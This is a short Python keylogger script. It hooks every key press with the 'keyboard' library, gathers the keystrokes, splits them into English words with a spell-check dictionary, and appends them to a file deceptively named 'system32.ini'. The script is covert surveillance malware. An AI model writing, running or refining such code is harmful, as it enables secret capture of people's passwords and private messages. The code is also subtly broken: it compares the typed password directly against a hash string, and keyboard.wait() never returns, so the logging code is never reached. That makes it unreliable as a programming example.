import keyboard
import enchant

# Define the output file and password hash
output_file = 'system32.ini'
password_hash = '8f4343dce12e58f4922a7f0168e4ee4c'  # Replace with your own password hash

# Initialize the key string
keys_pressed = ''

# Initialize the English dictionary
d = enchant.Dict('en_US')

# Define the callback function to be called when a key is pressed
def on_key_press(event):
    global keys_pressed
    key_name = event.name
    keys_pressed += key_name

# Prompt the user for a password
password = input('Enter password: ')

# Check if the password is correct
if password != password_hash:
    print('Incorrect password. Exiting...')
    exit()

# Hook the callback function to the key press event
keyboard.on_press(on_key_press)

# Block the main thread to keep the script running
keyboard.wait()

# Initialize the output string
output_str = ''

# Add spaces between valid English words in the keys_pressed string
i = 0
while i < len(keys_pressed):
    j = i + 1
    while j <= len(keys_pressed):
        substr = keys_pressed[i:j]
        if d.check(substr):
            output_str += substr + ' '
            i = j
            break
        j += 1
    if j == len(keys_pressed) + 1:
        output_str += keys_pressed[i:]
        break

# Write the output string to the output file
with open(output_file, 'a') as f:
    print(output_str, file=f)
